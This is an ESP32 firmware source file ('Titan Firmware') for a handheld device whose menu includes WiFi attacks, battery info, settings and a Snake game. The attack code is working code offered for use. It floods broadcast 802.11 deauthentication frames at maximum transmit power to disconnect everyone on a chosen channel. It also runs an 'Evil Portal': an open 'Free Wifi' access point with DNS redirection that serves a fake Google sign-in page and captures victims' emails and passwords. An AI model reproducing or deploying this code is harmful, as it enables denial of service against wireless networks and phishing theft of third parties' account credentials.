#include <TFT_eSPI.h>
#include <WiFi.h>
#include <FS.h>
#include <SD.h>
#include <esp_adc_cal.h>
#include "esp_wifi.h"
#include "pin_config.h"
#include <WebServer.h>
#include <DNSServer.h>

// GPIO and definitions
#define BACKLIGHT_PIN 15
#define BUTTON_A      0
#define BUTTON_B      14
#define PIN_BAT_VOLT  4

const char* firmware_version = "1.1.3";

// Main menu with new "Games" category added
const char* menu_items[] = {"Wifi Attack", "BLE Attack", "Games", "Settings", "Info", "Battery Info", "Turn Off"};
const int menu_size = sizeof(menu_items) / sizeof(menu_items[0]);
int current_menu_index = 0;

// Colors used
const uint16_t COLOR_RED    = TFT_RED;
const uint16_t COLOR_WHITE  = TFT_WHITE;
const uint16_t COLOR_ORANGE = TFT_ORANGE;
const uint16_t COLOR_VIOLET = TFT_VIOLET;
const uint16_t COLOR_BLUE   = TFT_BLUE;
const uint16_t COLOR_BLACK  = TFT_BLACK;
const uint16_t COLOR_GREEN  = TFT_GREEN; // Added for the Snake game

uint16_t main_color = COLOR_VIOLET;  // Default main color
int brightness = 255;                // Brightness (0-255)

// Button state (for debounce)
bool buttonA_pressed = false;
bool buttonB_pressed = false;

// TFT display instance
TFT_eSPI tft = TFT_eSPI();

// Backlight via LEDC (ESP32)
const int LEDC_CHANNEL    = 0;
const int LEDC_FREQUENCY  = 5000;
const int LEDC_RESOLUTION = 8; // 8 bits (0-255)

// Web server and DNS for the Evil Portal
WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

// Embedded HTML content (captive portal)
const char* evilPortalHtml = R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <style>
      body { font-family: sans-serif; }
      .login-container {
        width: 85%;
        margin: auto;
        padding: 20px;
        border-radius: 5px;
        margin-top: 10px;
      }
      #logo { margin: auto; width: fit-content; }
      .g-h1 { font-size: 25px; text-align: center; font-weight: 200; margin: auto; }
      .g-h2 { font-size: 15px; text-align: center; font-weight: 200; margin: auto; }
      .g-input {
        width: 95%;
        height: 30px;
        background-color: transparent;
        font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
        border-width: 0.5px;
        border-color: rgba(0, 0, 0, 0.6);
        border-radius: 4px;
        font-size: 16px;
        padding: 13px 9px;
        margin-bottom: 10px;
      }
      .create-account {
        font-size: smaller;
        color: #1a73e8;
        text-decoration: none;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        letter-spacing: 0.25px;
      }
      .gbtn-primary {
        min-width: 64px;
        border: none;
        margin-top: 6px;
        margin-bottom: 6px;
        height: 36px;
        border-radius: 4px;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        font-weight: 500;
        padding: 0 24px;
        box-sizing: inherit;
        background-color: rgb(26, 115, 232);
        color: #fff;
      }
      .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .text {
        font-family: Roboto, "Noto Sans Myanmar UI", Arial, sans-serif;
        white-space: normal;
        color: #5f6368;
        font-size: 14px;
        line-height: 1.4286;
        padding-bottom: 3px;
        padding-top: 9px;
        box-sizing: inherit;
      }
      .txt {
        text-decoration: none;
        border-radius: 4px;
        color: #1a73e8;
      }
    </style>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  </head>
  <body>
    <div class="login-container">
      <div id="logo">
        <!-- Logo SVG -->
      </div>
      <form action="/get" id="email-form-step">
        <h1 class="g-h1">Sign in</h1>
        <h2 class="g-h2">Use your Google Account</h2>
        <div class="login-content">
          <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
          <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
          <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt">Learn more</a></div>
          <div class="button-container">
            <a class="create-account" href="caca.html">Create account</a>
            <button class="gbtn-primary" type="submit">Next</button>
          </div>
        </div>
      </form>
    </div>
  </body>
</html>
)rawliteral";

// Deauthentication frame (defined only once)
static const uint8_t deauthFrame[] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x07, 0x00
};

// Utility function: wait for button press (debounce)
void waitForButtonPress(int pin) {
  while (digitalRead(pin) == HIGH) {
    delay(50);
  }
  delay(200);
}

// Utility function: detect button press with debounce
bool isButtonPressed(int pin, bool &buttonState) {
  if (digitalRead(pin) == LOW && !buttonState) {
    buttonState = true;
    delay(200);
    return true;
  }
  if (digitalRead(pin) == HIGH && buttonState)
    buttonState = false;
  return false;
}

// Send deauthentication frame to all (only for initial configuration if needed)
void sendDeauthFrameToAll(int channel) {
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Error setting WiFi channel");
    return;
  }
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

// Continuous sending of deauthentication packets without packet limit
void continuousDeauthAttackToAll(int channel) {
  // Configure channel only once
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Error setting WiFi channel");
    return;
  }

  // Ensure TX power is set to maximum (19.5 dBm here)
  esp_wifi_set_max_tx_power(78);  // 78 * 0.25 = 19.5 dBm

  displayAttackScreen();

  uint32_t packetCount = 0;
  uint32_t lastUpdate = millis();
  char buf[20];

  // Continuous sending loop, without unnecessary delay to maximize throughput
  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    packetCount++;

    // Update display every 100 ms
    if (millis() - lastUpdate >= 100) {
      updatePacketCountDisplay(packetCount);
      lastUpdate = millis();
    }
  }
  Serial.println("Attack stopped");
  delay(500); // Final debounce delay
}

void displayAttackScreen() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Attack in progress", tft.width()/2, 20);
  tft.setTextSize(1);
  tft.drawString("A: Stop", tft.width()/2, tft.height()-20);
}

void updatePacketCountDisplay(uint32_t packetCount) {
  tft.fillRect(0, 40, tft.width(), 20, COLOR_BLACK);
  char buf[20];
  sprintf(buf, "Packets: %lu", packetCount);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextDatum(TC_DATUM);
  tft.drawString(buf, tft.width()/2, 50);
}

// Sub-menu for Wifi Attack: choose between Deauth and Evil Portal
void displayWifiAttackSubMenu() {
  int attackOption = 0;  // 0: Deauth Attack, 1: Evil Portal
  bool selectionDone = false;
  while (!selectionDone) {
    displayWifiAttackOptions(attackOption);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      attackOption = (attackOption + 1) % 2;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }
  if (attackOption == 0)
    displayWifiDeauthAttack();
  else
    displayWifiEvilPortal();
}

void displayWifiAttackOptions(int attackOption) {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  if (attackOption == 0)
    tft.drawString("Deauth Attack", tft.width()/2, tft.height()/2 - 10);
  else
    tft.drawString("Evil Portal", tft.width()/2, tft.height()/2 - 10);

  tft.setTextSize(1);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("B: Change | A: Select", tft.width()/2, tft.height()-20);
}

// WiFi Mode: Deauth Attack
void displayWifiDeauthAttack() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("WiFi Attack", tft.width()/2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Scanning networks...", 10, 50);

  int n = WiFi.scanNetworks();
  delay(500);
  if (n == 0) {
    tft.fillScreen(COLOR_BLACK);
    tft.drawString("No networks found", 10, 70);
    waitForButtonPress(BUTTON_A);
    displayMenu();
    return;
  }

  int targetIndex = selectWifiNetwork(n);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Target:", tft.width()/2, 30);
  tft.drawString(WiFi.SSID(targetIndex), tft.width()/2, 60);
  delay(2000);

  int channel = WiFi.channel(targetIndex);
  continuousDeauthAttackToAll(channel);
  displayMenu();
}

int selectWifiNetwork(int n) {
  int targetIndex = 0;
  bool selectionDone = false;
  const int pageSize = 5;
  int pageStart = 0;
  const int listY = 40;
  const int listH = pageSize * 20;

  while (!selectionDone) {
    displayWifiNetworks(targetIndex, pageStart, pageSize, listY, listH, n);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      targetIndex = (targetIndex + 1) % n;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }
  return targetIndex;
}

void displayWifiNetworks(int targetIndex, int &pageStart, int pageSize, int listY, int listH, int n) {
  tft.fillRect(0, 0, tft.width(), listY, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Select Network", tft.width()/2, 10);

  pageStart = targetIndex - pageSize / 2;
  if (pageStart < 0) pageStart = 0;
  if (pageStart + pageSize > n) pageStart = n - pageSize;
  if (pageStart < 0) pageStart = 0;

  tft.fillRect(0, listY, tft.width(), listH, COLOR_BLACK);
  for (int i = pageStart; i < pageStart + pageSize && i < n; i++) {
    int yPos = listY + (i - pageStart) * 20;
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 20) {
      ssid = ssid.substring(0, 20) + "...";
    }
    String info = String(i + 1) + ": " + ssid + " (Ch:" + String(WiFi.channel(i)) + ")";
    if (i == targetIndex) {
      tft.fillRect(5, yPos - 2, tft.width() - 10, 18, main_color);
      tft.setTextColor(COLOR_BLACK, main_color);
    } else {
      tft.setTextColor(main_color, COLOR_BLACK);
    }
    tft.setTextSize(1);
    tft.setTextDatum(TL_DATUM);
    tft.drawString(info, 10, yPos);
  }
  tft.fillRect(0, tft.height()-20, tft.width(), 20, COLOR_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("B: Next | A: Select", tft.width()/2, tft.height()-15);
}

// WiFi Mode: Evil Portal – Open AP, DNS redirection and instant credential capture
void displayWifiEvilPortal() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Evil Portal", tft.width()/2, 20);

  const char* ap_ssid = "Free Wifi";
  // Start an open AP
  WiFi.mode(WIFI_AP);
  if (WiFi.softAP(ap_ssid)) {
    Serial.println("AP launched (open)");
  } else {
    Serial.println("Error launching AP");
  }

  IPAddress apIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(apIP);

  // Start DNS server to redirect all queries to the AP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Configure the web server
  server.on("/", [](){
    server.send(200, "text/html", evilPortalHtml);
  });
  server.on("/get", [](){
    handleCapturedCredentials();
  });
  server.onNotFound([apIP](){
    server.sendHeader("Location", String("http://") + apIP.toString() + "/", true);
    server.send(302, "text/plain", "");
  });
  server.begin();

  displayEvilPortalRunningScreen();

  // Loop to handle DNS and web server
  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    dnsServer.processNextRequest();
    server.handleClient();
    delay(10);
  }
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(500);
  displayMenu();
}

void handleCapturedCredentials() {
  String email = server.arg("email");
  String password = server.arg("password");
  Serial.println("Captured credentials:");
  Serial.println("Email: " + email);
  Serial.println("Password: " + password);

  // Direct display on the TFT screen
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Login received", tft.width()/2, 20);
  tft.setTextSize(1);
  tft.drawString("Email:", tft.width()/2, 50);
  tft.drawString(email, tft.width()/2, 70);
  tft.drawString("Password:", tft.width()/2, 90);
  tft.drawString(password, tft.width()/2, 110);

  delay(3000);
  server.send(200, "text/html", "<html><body><h1>Please wait...</h1></body></html>");
}

void displayEvilPortalRunningScreen() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Evil Portal Running", tft.width()/2, tft.height()/2 - 20);
  tft.setTextSize(1);
  tft.drawString("SSID: Free Wifi", tft.width()/2, tft.height()/2);
  tft.drawString("No password", tft.width()/2, tft.height()/2 + 10);
  tft.drawString("A: Stop", tft.width()/2, tft.height()-20);
}

// Display system information
void displayInfo() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Information", tft.width()/2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  const char* infos[] = {
    "Chip: ESP32-S3",
    "Screen: 170x320",
    "Flash: 16MB",
    "PSRAM: 8MB",
    "Battery: N/A"
  };
  for (int i = 0; i < 5; i++) {
    tft.drawString(infos[i], 10, 50 + i * 20);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// Display battery information
void displayBatteryInfo() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Battery Info", tft.width()/2, 20);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  if (voltage > 4300)
    tft.drawString("No battery connected!", 10, 50);
  else
    tft.drawString("Voltage: " + String(voltage) + " mV", 10, 50);

  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// Display battery percentage
void displayBatteryPercentage() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  int percentage = map(voltage, 3300, 4200, 0, 100);
  if (percentage < 0) percentage = 0;
  if (percentage > 100) percentage = 100;

  tft.setTextSize(1);
  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString(String(percentage) + "%", tft.width() - 5, 5);
}

// Function to turn off the display
void turnOffDisplay() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Turning Off...", tft.width()/2, tft.height()/2);
  delay(1000);

  digitalWrite(PIN_POWER_ON, LOW);
  digitalWrite(PIN_LCD_BL, LOW);
  tft.writecommand(0x10);
  esp_sleep_enable_ext0_wakeup((gpio_num_t)PIN_BUTTON_2, 0);
  esp_deep_sleep_start();
}

// Display settings (color and brightness)
void displaySettings() {
  const char* colors[] = {"Red", "White", "Orange", "Violet", "Blue"};
  uint16_t color_values[] = {COLOR_RED, COLOR_WHITE, COLOR_ORANGE, COLOR_VIOLET, COLOR_BLUE};
  int color_index = 0;
  while (true) {
    displaySettingsScreen(colors, color_index);

    if (digitalRead(BUTTON_A) == LOW) {
      brightness += 20;
      if (brightness > 255) brightness = 20;
      ledcWrite(LEDC_CHANNEL, brightness);
      delay(200);
    }
    if (digitalRead(BUTTON_B) == LOW) {
      unsigned long press_time = millis();
      while (digitalRead(BUTTON_B) == LOW) {
        if (millis() - press_time > 1000) {
          displayMenu();
          return;
        }
      }
      color_index = (color_index + 1) % 5;
      main_color = color_values[color_index];
      delay(200);
    }
    delay(100);
  }
}

void displaySettingsScreen(const char* colors[], int color_index) {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Settings", tft.width()/2, 20);

  tft.setTextSize(2);
  tft.drawString("Main color:", tft.width()/2, tft.height()/2 - 30);
  tft.setTextSize(3);
  tft.drawString(colors[color_index], tft.width()/2, tft.height()/2);

  tft.setTextSize(2);
  tft.drawString("Brightness: " + String(brightness), tft.width()/2, tft.height()/2 + 50);
}

//-----------------------//
//    SNAKE GAME         //
//-----------------------//

// A simple Snake game using the TFT display.
// The snake moves on a grid. Use BUTTON_A to rotate left and BUTTON_B to rotate right.
void displaySnakeGame() {
  tft.fillScreen(COLOR_BLACK);
  const int cellSize = 10;
  int gridWidth = tft.width() / cellSize;
  int gridHeight = tft.height() / cellSize;

  // Snake variables
  const int maxLength = 100;
  int snakeX[maxLength], snakeY[maxLength];
  int snakeLength = 3;
  // Directions: 0=Up, 1=Right, 2=Down, 3=Left
  int direction = 1; // Initial direction: right

  // Initialize snake in the center
  snakeX[0] = gridWidth / 2;
  snakeY[0] = gridHeight / 2;
  snakeX[1] = snakeX[0] - 1;
  snakeY[1] = snakeY[0];
  snakeX[2] = snakeX[0] - 2;
  snakeY[2] = snakeY[0];

  // Place first food randomly
  int foodX = random(0, gridWidth);
  int foodY = random(0, gridHeight);

  bool gameOver = false;

  while (!gameOver) {
    // Change direction: BUTTON_A rotates left, BUTTON_B rotates right
    if (digitalRead(BUTTON_A) == LOW) {
      direction = (direction + 3) % 4;
      delay(150);
    }
    if (digitalRead(BUTTON_B) == LOW) {
      direction = (direction + 1) % 4;
      delay(150);
    }

    // Move snake: shift body
    for (int i = snakeLength - 1; i > 0; i--) {
      snakeX[i] = snakeX[i - 1];
      snakeY[i] = snakeY[i - 1];
    }
    // Update head position based on current direction
    if (direction == 0) snakeY[0]--;
    else if (direction == 1) snakeX[0]++;
    else if (direction == 2) snakeY[0]++;
    else if (direction == 3) snakeX[0]--;

    // Check collision with walls
    if (snakeX[0] < 0 || snakeX[0] >= gridWidth || snakeY[0] < 0 || snakeY[0] >= gridHeight) {
      gameOver = true;
    }
    // Check collision with itself
    for (int i = 1; i < snakeLength; i++) {
      if (snakeX[0] == snakeX[i] && snakeY[0] == snakeY[i]) {
        gameOver = true;
      }
    }
    // Check if food is eaten
    if (snakeX[0] == foodX && snakeY[0] == foodY) {
      if (snakeLength < maxLength) {
        snakeLength++;
      }
      foodX = random(0, gridWidth);
      foodY = random(0, gridHeight);
    }

    // Draw game
    tft.fillScreen(COLOR_BLACK);
    // Draw food
    tft.fillRect(foodX * cellSize, foodY * cellSize, cellSize, cellSize, COLOR_RED);
    // Draw snake
    for (int i = 0; i < snakeLength; i++) {
      tft.fillRect(snakeX[i] * cellSize, snakeY[i] * cellSize, cellSize, cellSize, COLOR_GREEN);
    }

    delay(200);
  }

  // Game over screen
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.drawString("Game Over", tft.width()/2, tft.height()/2);
  delay(3000);
  displayMenu();
}

// Main menu category selection
void enterCategory() {
  String currentItem = menu_items[current_menu_index];
  if (currentItem == "Wifi Attack") {
    displayWifiAttackSubMenu();
  } else if (currentItem == "Info") {
    displayInfo();
  } else if (currentItem == "Settings") {
    displaySettings();
  } else if (currentItem == "Battery Info") {
    displayBatteryInfo();
  } else if (currentItem == "BLE Attack") {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("BLE Attack", tft.width()/2, tft.height()/2);
    delay(1000);
    displayMenu();
  } else if (currentItem == "Games") {
    displaySnakeGame();
  } else if (currentItem == "Turn Off") {
    turnOffDisplay();
  } else {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Unknown Menu", tft.width()/2, tft.height()/2);
    delay(1000);
    displayMenu();
  }
}

// Handle button presses in the main loop
void handleButtonPress() {
  if (isButtonPressed(BUTTON_A, buttonA_pressed))
    enterCategory();
  else if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
    current_menu_index = (current_menu_index + 1) % menu_size;
    displayMenu();
  }
}

// Splash Screen
void showSplashScreen() {
  tft.fillScreen(COLOR_BLACK);

  // Display "Titan" in white
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextSize(6);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Titan", tft.width() / 2, tft.height() / 2 - 25);

  // Display "Os" in violet
  tft.setTextColor(COLOR_VIOLET, COLOR_BLACK);
  tft.setTextSize(6);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Os", tft.width() / 2, tft.height() / 2 + 35);

  delay(5000);
}

// Display main menu
void displayMenu() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(3);
  tft.setTextDatum(MC_DATUM);
  tft.drawString(menu_items[current_menu_index], tft.width()/2, tft.height()/2);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Titan Firmware", 5, 5);

  // Line below "Titan Firmware"
  tft.drawFastHLine(5, 20, tft.width() - 10, main_color);

  tft.setTextDatum(BL_DATUM);
  tft.drawString(firmware_version, 5, tft.height()-5);

  String categoryText = "Category: " + String(current_menu_index + 1) + "/" + String(menu_size);
  tft.setTextDatum(BR_DATUM);
  tft.drawString(categoryText, tft.width()-5, tft.height()-5);

  // Line above battery percentage
  tft.drawFastHLine(5, tft.height() - 25, tft.width() - 10, main_color);

  displayBatteryPercentage();
}

// Setup
void setup() {
  Serial.begin(115200);

  // Configure backlight via LEDC
  pinMode(BACKLIGHT_PIN, OUTPUT);
  ledcSetup(LEDC_CHANNEL, LEDC_FREQUENCY, LEDC_RESOLUTION);
  ledcAttachPin(BACKLIGHT_PIN, LEDC_CHANNEL);
  ledcWrite(LEDC_CHANNEL, brightness);

  pinMode(BUTTON_A, INPUT_PULLUP);
  pinMode(BUTTON_B, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(COLOR_BLACK);

  // Configure WiFi in station mode (for deauthentication attack)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Set maximum TX power
  esp_wifi_set_max_tx_power(78);  // 78 * 0.25 = 19.5 dBm

  showSplashScreen();
  displayMenu();
}

// Main loop
void loop() {
  static unsigned long lastActivityTime = millis();
  const unsigned long screenOffDelay = 15000; // 15 seconds

  handleButtonPress();

  // Handle inactivity
  if (millis() - lastActivityTime >= screenOffDelay) {
    tft.fillScreen(COLOR_BLACK);
    bool screenOff = true;
    while (screenOff) {
      if (digitalRead(BUTTON_A) == LOW || digitalRead(BUTTON_B) == LOW) {
        screenOff = false;
        displayMenu();
        lastActivityTime = millis();
      }
      delay(50);
    }
  }
  delay(50);
}
